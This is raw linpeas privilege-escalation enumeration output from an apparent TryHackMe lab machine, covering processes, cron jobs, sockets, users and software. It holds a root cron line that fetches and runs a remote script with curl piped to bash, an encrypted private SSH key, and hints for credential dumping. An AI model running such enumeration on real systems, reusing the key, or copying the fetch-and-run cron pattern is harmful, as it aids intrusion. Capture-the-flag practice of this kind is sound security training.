                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present
╔══════════╣ Am I Containered?                                                                                                                                                                                                              
╔══════════╣ Container details                                                                                                                                                                                                              
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-05f9aa475163632e0                                                                                                                                                                                                               
instance-action: none
instance-id: i-0d26fa4665d2bfa8f
instance-life-cycle: spot
instance-type: t2.micro
region: eu-west-1

══╣ Account Info
{                                                                                                                                                                                                                                           
  "Code" : "Success",
  "LastUpdated" : "2022-10-31T21:15:32Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:aa:84:bb:90:39/                                                                                                                                                                                                                     
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                                                                                                                                                                            

══╣ User Data
                                                                                                                                                                                                                                            

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                 
root         1  3.5  0.8 159596  8788 ?        Ss   21:16   0:07 /sbin/init maybe-ubiquity                                                                                                                                                  
root       406  0.8  1.6 119388 16668 ?        S<s  21:16   0:01 /lib/systemd/systemd-journald
root       416  0.0  0.1 105904  1928 ?        Ss   21:16   0:00 /sbin/lvmetad -f
root       425  0.6  0.5  46256  5200 ?        Ss   21:17   0:01 /lib/systemd/systemd-udevd
systemd+   539  0.2  0.3 141932  3396 ?        Ssl  21:17   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   582  0.1  0.5  80048  5220 ?        Ss   21:17   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   584  0.1  0.5  70636  5412 ?        Ss   21:17   0:00 /lib/systemd/systemd-resolved
tryhack+   601  0.0  0.6 1008800 6724 ?        Ssl  21:17   0:00 /home/tryhackme/server -p 80
  └─(Caps) 0x0000000000000400=cap_net_bind_service
message+   602  0.1  0.4  50100  4596 ?        Ss   21:17   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       603  0.5  1.7 169188 17156 ?        Ssl  21:17   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       604  0.1  0.5  70592  5992 ?        Ss   21:17   0:00 /lib/systemd/systemd-logind
syslog     606  0.0  0.4 263040  4292 ?        Ssl  21:17   0:00 /usr/sbin/rsyslogd -n
daemon[0m     615  0.0  0.2  28332  2516 ?        Ss   21:17   0:00 /usr/sbin/atd -f
root       619  0.0  0.6 286352  6876 ?        Ssl  21:17   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       621  0.0  0.3  30104  3112 ?        Ss   21:17   0:00 /usr/sbin/cron -f
root       642  0.0  0.7 291392  7304 ?        Ssl  21:17   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       646  0.4  2.0 186032 20160 ?        Ssl  21:17   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       671  0.0  0.5  72300  5756 ?        Ss   21:17   0:00 /usr/sbin/sshd -D
james      842  0.0  0.3 108120  3420 ?        S    21:17   0:00      _ sshd: james@pts/0
james      844  0.2  0.4  21564  4960 pts/0    Ss   21:17   0:00          _ -bash
james      978  0.1  0.2   5336  2564 pts/0    S+   21:18   0:00              _ /bin/sh ./linpeas.sh
james     4392  0.0  0.0   5336   868 pts/0    S+   21:20   0:00                  _ /bin/sh ./linpeas.sh
james     4396  0.0  0.3  38612  3684 pts/0    R+   21:20   0:00                  |   _ ps fauxwww
james     4395  0.0  0.0   5336   868 pts/0    S+   21:20   0:00                  _ /bin/sh ./linpeas.sh
root       673  0.0  0.2  14768  2288 ttyS0    Ss+  21:17   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       674  0.0  0.1  13244  1932 tty1     Ss+  21:17   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
james      727  0.1  0.7  76648  7684 ?        Ss   21:17   0:00 /lib/systemd/systemd --user
james      728  0.0  0.2 111744  2380 ?        S    21:17   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND    PID TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                                                                                                                                              

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                                          
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm Not Found                                                                                                                                                                                                                           
vsftpd Not Found                                                                                                                                                                                                                            
apache2 Not Found                                                                                                                                                                                                                           
sshd: process found (dump creds from memory as root)                                                                                                                                                                                        

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     822 Jun 27  2020 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  589 Jan 14  2020 mdadm
-rw-r--r--  1 root root  191 Feb  3  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Jun 27  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 90 root root 4096 Jun 27  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                                                                              
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                           

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                                                                 
You can't write on systemd PATH                                                                                                                                                                                                             

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES                                                                                                                   
Mon 2022-10-31 21:31:47 UTC  11min left  n/a                          n/a          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Tue 2022-11-01 04:13:29 UTC  6h left     Mon 2022-10-31 21:17:33 UTC  2min 50s ago motd-news.timer              motd-news.service
Tue 2022-11-01 06:14:29 UTC  8h left     Mon 2022-10-31 21:17:33 UTC  2min 50s ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Tue 2022-11-01 17:01:17 UTC  19h left    Mon 2022-10-31 21:17:33 UTC  2min 50s ago apt-daily.timer              apt-daily.service
Mon 2022-11-07 00:00:00 UTC  6 days left Mon 2022-10-31 21:17:33 UTC  2min 50s ago fstrim.timer                 fstrim.service
n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                                                                                 
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/run/acpid.socket                                                                                                                                                                                                                           
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1001/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1001/systemd/notify
  └─(Read Write)
/run/user/1001/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                                                                                                      
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                                                    
:1.0                                 584 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
:1.1                                 582 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.27                               6763 busctl          james            :1.27         session-1.scope           1          -                  
:1.4                                 604 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
:1.5                                 619 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
:1.6                                 642 polkitd         root             :1.6          polkit.service            -          -                  
:1.7                                 603 networkd-dispat root             :1.7          networkd-dispatcher.se…ce -          -                  
:1.9                                 646 unattended-upgr root             :1.9          unattended-upgrades.se…ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             619 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           642 polkitd         root             :1.6          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               604 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
org.freedesktop.network1             582 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             584 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Hostname, hosts and DNS
overpass-prod                                                                                                                                                                                                                               
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.209.252  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::aa:84ff:febb:9039  prefixlen 64  scopeid 0x20<link>
        ether 02:aa:84:bb:90:39  txqueuelen 1000  (Ethernet)
        RX packets 1228  bytes 910730 (910.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1182  bytes 252702 (252.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 242  bytes 20808 (20.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 242  bytes 20808 (20.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                                                                    
uid=1001(james) gid=1001(james) groups=1001(james)                                                                                                                                                                                          

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                                                                      
ptrace protection is enabled (1)                                                                                                                                                                                                            
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                  
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
james:x:1001:1001:,,,:/home/james:/bin/bash                                                                                                                                                                                                 
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
uid=1001(james) gid=1001(james) groups=1001(james)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 21:20:26 up 3 min,  1 user,  load average: 1.93, 1.01, 0.42                                                                                                                                                                                
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
james    pts/0    10.18.23.136     21:18    1:38   0.59s  0.00s /bin/sh ./linpeas.sh

╔══════════╣ Last logons
tryhackme pts/0        Sat Jun 27 04:01:36 2020 - Sat Jun 27 04:15:54 2020  (00:14)     192.168.170.1                                                                                                                                       
reboot   system boot  Sat Jun 27 04:01:18 2020 - Sat Jun 27 04:15:54 2020  (00:14)     0.0.0.0
tryhackme pts/0        Sat Jun 27 03:59:56 2020 - Sat Jun 27 04:01:08 2020  (00:01)     192.168.170.1
tryhackme pts/0        Sat Jun 27 02:28:30 2020 - Sat Jun 27 03:59:50 2020  (01:31)     192.168.170.1
reboot   system boot  Sat Jun 27 02:27:38 2020 - Sat Jun 27 04:01:13 2020  (01:33)     0.0.0.0
tryhackme pts/0        Sat Jun 27 02:16:00 2020 - Sat Jun 27 02:27:33 2020  (00:11)     192.168.170.1
tryhackme tty1         Sat Jun 27 02:15:41 2020 - Sat Jun 27 02:17:21 2020  (00:01)     0.0.0.0
reboot   system boot  Sat Jun 27 02:14:58 2020 - Sat Jun 27 02:27:34 2020  (00:12)     0.0.0.0

wtmp begins Sat Jun 27 02:14:58 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           
tryhackme        pts/0    10.10.155.141    Thu Sep 24 21:04:14 +0000 2020
james            pts/0    10.18.23.136     Mon Oct 31 21:18:00 +0000 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C++ compiler                                                                                                                    
ii  g++-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C++ compiler
ii  gcc                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Jun 27  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
-rw------- 1 james james 1766 Jun 27  2020 /home/james/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
-rw-r--r-- 1 james james 401 Jun 27  2020 /home/james/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7Kz42EMWhCKWlTuKIPJmNMAL53yO/QBkbjCP28TYpb3ioDXEdZjXFBAg3aAegUpbCBKJKTmOKTp7Z4AyWvRkUnzxw5e9K1hh7Apn1GdxR66Lj/1ssvZbP7wIL1gGYtavtcWPmW9JdPn72u82joXKH1KNLVksWTyif5XXoo21ppyVcVW0qo7tEeJi7mIweWfM3Mo8u4Hhb3AOsS8QLux2fKmp/a7bUA923MuZjRdRiEvzuZ7/DddgtcTRARnu/fUHjHp71ZqfD1wJ9b9zKFqmd/5v5ysuH0onozqOf8XExVHIAxRSq+OPiUmUzXPbi0ADxbpj2DVYMUuuPjpJjin/N james@overpass-prod



-rw-rw-r-- 1 james james 401 Jun 27  2020 /home/james/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7Kz42EMWhCKWlTuKIPJmNMAL53yO/QBkbjCP28TYpb3ioDXEdZjXFBAg3aAegUpbCBKJKTmOKTp7Z4AyWvRkUnzxw5e9K1hh7Apn1GdxR66Lj/1ssvZbP7wIL1gGYtavtcWPmW9JdPn72u82joXKH1KNLVksWTyif5XXoo21ppyVcVW0qo7tEeJi7mIweWfM3Mo8u4Hhb3AOsS8QLux2fKmp/a7bUA923MuZjRdRiEvzuZ7/DddgtcTRARnu/fUHjHp71ZqfD1wJ9b9zKFqmd/5v5ysuH0onozqOf8XExVHIAxRSq+OPiUmUzXPbi0ADxbpj2DVYMUuuPjpJjin/N james@overpass-prod

ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes

══╣ Possible private SSH keys were found!
/home/james/.ssh/id_rsa

══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                                                                                                                                                       
/usr/local/go/src/crypto/tls/testdata/example-cert.pem
/usr/local/go/src/crypto/tls/testdata/example-key.pem
/usr/local/go/src/crypto/x509/test-file.crt
/usr/local/go/src/crypto/x509/testdata/test-dir.crt
978PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                                                                              
ChallengeResponseAuthentication no
UsePAM yes
